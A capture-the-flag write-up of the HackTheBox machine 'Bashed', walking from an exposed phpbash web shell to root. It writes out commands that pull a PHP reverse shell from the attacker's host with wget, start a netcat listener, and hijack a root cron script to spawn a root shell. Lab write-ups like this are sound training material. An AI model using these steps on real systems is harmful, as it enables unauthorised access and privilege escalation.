title: 'HTB: Bashed'
date: '2020-11-22 15:34:00 -0400'
categories:
  - HackTheBox
  - Write-ups
tags:
  - HTB
published: true
---

IP: 10.10.10.68

As always, we'll begin with an NMAP scan.

![a50326024ac45cd59ece5b33f1a25dbf.png](./../../assets/img/a50326024ac45cd59ece5b33f1a25dbf.png)

Looks like we don't have much of a choice. Let's take a look at the web server.

![6d7ae8ad84ab4fc3c66850364ebcd3c3.png](./../../assets/img/6d7ae8ad84ab4fc3c66850364ebcd3c3.png) 

We see mention of phpbash, but no clear indication of where it is located. Checking the system with nikto gives us some useful info.

![5aca2940dd04b5f6f384eaf257800443.png](./../../assets/img/5aca2940dd04b5f6f384eaf257800443.png)
![15a956b0c88a755101b8a50365cb8228.png](./../../assets/img/15a956b0c88a755101b8a50365cb8228.png) 

This is definitely our way into the box. Simply call  `phpbash.php`  and we're good to go.

![e251038821a976d099c9e2d834765652.png](./../../assets/img/e251038821a976d099c9e2d834765652.png)

Since we're here, we can go grab the user flag to get it out of the way.

![f8191ac38ab64b04958b4d03367838c9.png](./../../assets/img/f8191ac38ab64b04958b4d03367838c9.png)

From here we need to figure out our escalation.  `Sudo -l`  shows us that we have access to another user.

![a9f8f48a2973fa58a4a7d0e05153908b.png](./../../assets/img/a9f8f48a2973fa58a4a7d0e05153908b.png)

We have the ability to access the  `scriptmanager`  account, but we need a better shell first. Grab a copy of  `php-reverse-shell.php`  from  `/usr/share/webshells/php`  and edit the IP to match your system. Host the file using  `python -m Simple HTTPServer 80`  and use  `wget http://10.10.14.5/php-reverse-shell.php`  on the target system to download the PHP file into  `/var/www/html/uploads.`

![edb029b4762c21b7b0f153413e86df23.png](./../../assets/img/edb029b4762c21b7b0f153413e86df23.png)
![8fc9a34ee76c9d1d9023024cc588d892.png](./../../assets/img/8fc9a34ee76c9d1d9023024cc588d892.png)

We're using a PHP reverse shell since we know we have PHP on the system. You can use something else to host the file, but I find that Python is the quickest way to get things online. We're using  `/var/www/html/uploads`  because it's a directory that we can both write to, and call from our browser. Once you have the PHP file on the target system, start a NC listener  with  `nc -lvp 4444`  and call  `http://10.10.10.68/uploads/php-reverse-shell.php`  in your browser.

![02c99b300ecdbcc06224cbb378677cfe.png](./../../assets/img/02c99b300ecdbcc06224cbb378677cfe.png)

We were able to break out into a clean TTY with Python and then sudo to scriptmanager. Now we just need to dig around and see what we can do as our new user. After some poking around we can see that  `/scripts`  is owned by scriptmanager.

![d18e44e63210279a976fe3da769bef5f.png](./../../assets/img/d18e44e63210279a976fe3da769bef5f.png)

We can see that there is a  `test.py`  and a  `test.txt`  in the folder. The text file is owned by root, and it's being updated every minute. This indicates that there is a root level cron that is accessing the Python script.

![13c2eac14441c23265ef46474158c91f.png](./../../assets/img/13c2eac14441c23265ef46474158c91f.png)

We'll overwrite the Python script and use it to create a root level reverse shell back to our system.

![d1176551033fc1d5239de45e89cc763a.png](./../../assets/img/d1176551033fc1d5239de45e89cc763a.png)

Start up a new NC listener on port 4444 and just wait a minute.

![9550a2a607c2f024fefc7ce7b267142b.png](./../../assets/img/9550a2a607c2f024fefc7ce7b267142b.png)
